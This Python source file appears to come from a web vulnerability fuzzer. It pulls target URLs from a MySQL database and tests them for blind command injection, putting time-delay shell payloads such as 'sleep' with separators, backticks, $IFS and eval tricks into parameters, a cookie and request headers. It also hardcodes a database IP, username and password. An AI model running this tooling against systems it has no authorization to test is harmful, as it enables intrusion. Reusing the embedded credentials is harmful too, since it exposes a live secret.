import requests
import mysql.connector
import time
import json
from colorama import init, Fore, Style


class CommandInjection:
    def __init__(self):
        self.time_payloads_five = [
            ";zzingzzing=\";sleep 5\";eval $zzingzzing",
            "';zzingzzing=\";sleep 5\";eval $zzingzzing'"
                              ]
        self.time_payloads_ten = [
            ";zzingzzing=\";sleep 10\";eval $zzingzzing",
            "';zzingzzing=\";sleep 10\";eval $zzingzzing'"
        ]

        self.command_injection = open('payloads/Command Injection/command_payload.txt', 'r')
        self.connection = None
        self.cursor = None

    def file_close(self):
        self.command_injection.close()

    def get_url(self):
        url_list = []

        try:
            self.connection = mysql.connector.connect(
                host="13.209.63.65",
                database="Fuzzingzzingi",
                user="zzingzzingi",
                password="!Ru7eP@ssw0rD!12"
            )
            if self.connection.is_connected():
                self.cursor = self.connection.cursor()

                self.cursor.execute(f'SELECT url FROM requests;')
                result = self.cursor.fetchall()

                for url in result:
                    url_list.append(url[0])

        except Exception as e:
            print(f"SQL connect error : {e} ")

        return url_list

    def get_params(self, url):
        json_result = []

        self.cursor.execute('SELECT method, parameters FROM requests WHERE url=%s', (url,))
        result = self.cursor.fetchall()

        for(method, parameters) in result:
            json_data = json.loads(parameters)
            json_result.append((method, json_data))

        return json_result

    def generate_payloads(self, sec):
        cmd = [f"sleep {sec}", f"SleeP {sec}", f"SleEp$IFS{sec}", f"$(sleep {sec})", f'`sleep {sec}`']
        sp1 = ['"', "'", ";", "&&", "&", "|", "%", ""]

        for i in cmd:
            if sec == 5:
                self.time_payloads_five.append(i)
                for j in sp1:
                    if j == "'" and j == '"' and j == "" and j == "%" and j == "$":
                        pass
                    else:
                        payload = i + j
                        self.time_payloads_five.append(payload)
                    payload = j + i + j
                    self.time_payloads_five.append(payload)

            elif sec == 10:
                self.time_payloads_ten.append(i)
                for j in sp1:
                    if j == "'" and j == '"' and j == "" and j == "%" and j == "$":
                        pass
                    else:
                        payload = i + j
                        self.time_payloads_ten.append(payload)
                    payload = j + i + j
                    self.time_payloads_ten.append(payload)
    # 기본 페이로드 만들기

    def check_time_five(self, url, method, param):
        if param:
            for payload in self.time_payloads_five:
                for key in param:
                    param[key] = payload
                    print(f'CHECKING...\turl : {url}\t\tmethod : {method}\t\tpayload : {param}')
                    if method == 'GET':
                        try:
                            start_time = time.time()
                            resp_param = requests.get(url, params=param, timeout=10)
                            end_time = time.time() - start_time
                            if int(end_time) >= 5:
                                print(f"Checked Basic payload = {payload}")
                                return url, method, param

                            start_time = time.time()
                            resp_cookie = requests.get(url, cookies={'Cookie': payload}, timeout=10)
                            end_time = time.time() - start_time
                            if int(end_time) >= 5:
                                print(f"Checked Basic payload with COOKIES = {payload}")
                                return url, method, param

                            start_time = time.time()
                            resp_header = requests.get(url, headers={'User-Agent': payload,
                                                                     'Referer': payload,
                                                                     'X-Forwarded-For': payload},
                                                       timeout=10)
                            end_time = time.time() - start_time
                            if int(end_time) >= 5:
                                print(f"Checked Basic payload with HEADERS = {payload}")
                                return url, method, param

                        except Exception as e:
                            print(f'REQUEST ERROR : {payload}')

                    elif method == 'POST':
                        try:
                            start_time = time.time()
                            resp_param = requests.post(url, data=param, timeout=10)
                            end_time = time.time() - start_time
                            if int(end_time) >= 5:
                                print(f"Checked Basic payload = {payload}")
                                return url, method, param

                        except Exception as e:
                            print(f'REQUEST ERROR : {payload}')
        return False

    def check_time_ten(self, url, method, param):
        if param:
            for payload in self.time_payloads_ten:
                for key in param:
                    param[key] = payload
                    print(f'CHECKING...\turl : {url}\t\tmethod : {method}\t\tpayload : {param}')

                    if method == 'GET':
                        try:
                            start_time = time.time()
                            resp_param = requests.get(url, params=param, timeout=15)
                            end_time = time.time() - start_time
                            if int(end_time) >= 10:
                                print(f"Checked payload = {payload}")
                                return url, method, param

                            start_time = time.time()
                            resp_cookie = requests.get(url, cookies={'Cookie': payload}, timeout=15)
                            end_time = time.time() - start_time
                            if int(end_time) >= 10:
                                print(f"Checked payload with COOKIES = {payload}")
                                return url, method, param

                            start_time = time.time()
                            resp_header = requests.get(url, headers={'User-Agent': payload,
                                                                     'Referer': payload,
                                                                     'X-Forwarded-For': payload},
                                                       timeout=15)
                            end_time = time.time() - start_time
                            if int(end_time) >= 10:
                                print(f"Checked payload with HEADERS = {payload}")
                                return url, method, param

                        except Exception as e:
                            print(f'REQUEST ERROR : {payload}')

                    elif method == 'POST':
                        try:
                            start_time = time.time()
                            resp_param = requests.post(url, data=param, timeout=15)
                            end_time = time.time() - start_time
                            if int(end_time) >= 10:
                                print(f"Checked payload = {payload}")
                                return url, method, param

                        except Exception as e:
                            print(f'REQUEST ERROR : {payload}')
        return False

    def get_payloads(self):
        with open('payloads/Command Injection/command_payload.txt', 'r') as f:
            payloads = [p.strip() for p in f]
        return payloads

    def execute_injection(self, url, method, param, payloads):
        init()
        for payload in payloads:
            payload = payload.strip()
            for key in param.keys():
                param[key] = payload

                if method == 'GET':
                    try:
                        resp_param = requests.get(url, params=param, timeout=10)
                        print(f"{Style.BRIGHT}{Fore.RED}Command Injection{Style.RESET_ALL}\t method : {method}  URL : {url}\t params : {param}\t PAYLOAD : {payload}\t STATUS : {resp_param.status_code}")
                        resp_cookie = requests.get(url, cookies={'Cookie': payload}, timeout=10)
                        print(f"{Style.BRIGHT}{Fore.RED}Command Injection{Style.RESET_ALL}\t method : {method}  URL : {url}\t params : {param}\t PAYLOAD : {payload}\t STATUS : {resp_cookie.status_code}")
                        resp_header = requests.get(url, headers={'User-Agent': payload,
                                                                 'Referer': payload,
                                                                 'X-Forwarded-For': payload},
                                                   timeout=10)
                        print(f"{Style.BRIGHT}{Fore.RED}Command Injection{Style.RESET_ALL}\t method : {method}  URL : {url}\t params : {param}\t PAYLOAD : {payload}\t STATUS : {resp_header.status_code}")

                    except Exception as e:
                        print(f"{Style.BRIGHT}{Fore.RED}REQUEST ERROR{Style.RESET_ALL}\t method : {method}  URL : {url}\t params : {param}\t PAYLOAD : {payload}")

                elif method == 'POST':
                    try:
                        resp_param = requests.post(url, data=param, timeout=10)
                        print(f"{Style.BRIGHT}{Fore.RED}Command Injection{Style.RESET_ALL}\t method : {method}  URL : {url}\t params : {param}\t PAYLOAD : {payload}\t STATUS : {resp_param.status_code}")

                    except Exception as e:
                        print(f"{Style.BRIGHT}{Fore.RED}REQUEST ERROR{Style.RESET_ALL}\t method : {method}  URL : {url}\t params : {param}\t PAYLOAD : {payload}\t")
        else:
            print(f"{Style.BRIGHT}{Fore.BLUE}!!!\tThere is no Command Injection Vulnerability\t!!!{Style.RESET_ALL}")

    def execute_commandi(self, url, method, param, payloads):
        self.generate_payloads(5)
        self.generate_payloads(10)

        time_result_five = self.check_time_five(url, method, param)
        if time_result_five:
            five_url, five_method, five_param = time_result_five
            time_result = self.check_time_ten(five_url, five_method, five_param)

            if time_result:
                checked_url, checked_method, checked_param = time_result
                print(f'EXECUTING COMMAND INJECTION FUZZING...\turl : {checked_url}\t\tmethod : {checked_method}\t\tparam : {checked_param}')
                self.execute_injection(checked_url, checked_method, checked_param, payloads)
        else:
            print(f"{Style.BRIGHT}{Fore.BLUE}!!!\tThere is no Command Injection Vulnerability\t!!!{Style.RESET_ALL}")
